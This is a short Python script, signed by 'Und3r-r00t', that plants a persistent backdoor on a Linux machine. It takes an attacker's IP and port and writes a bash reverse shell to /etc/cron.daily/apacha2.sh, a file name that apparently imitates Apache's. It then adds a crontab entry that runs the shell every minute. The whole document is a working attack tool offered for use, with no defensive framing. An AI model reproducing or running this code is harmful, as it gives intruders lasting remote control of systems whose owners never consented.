import os

print('''
\033[1;31m
==============injction Payload in crontab==============
Use your real ip or use dnsexit & noip to get static ip
================ Coded By : Und3r-r00t ================\033[1;m
    ''')


ip = raw_input('Enter Your IP: ')
port = raw_input("Enter Your Port: ")

payload = '#!/bin/bash\nbash -i >& /dev/tcp/{}/{} 0>&1'.format(ip, port)

payloadGent = os.popen("echo '{}' > /etc/cron.daily/apacha2.sh".format(payload))

commamde = os.popen('crontab -l | { cat; echo "* * * * * /bin/bash /etc/cron.daily/apacha2.sh"; } | crontab -')


print('\033[1;31m=============== Payload is injected  ==============\033[1;m')
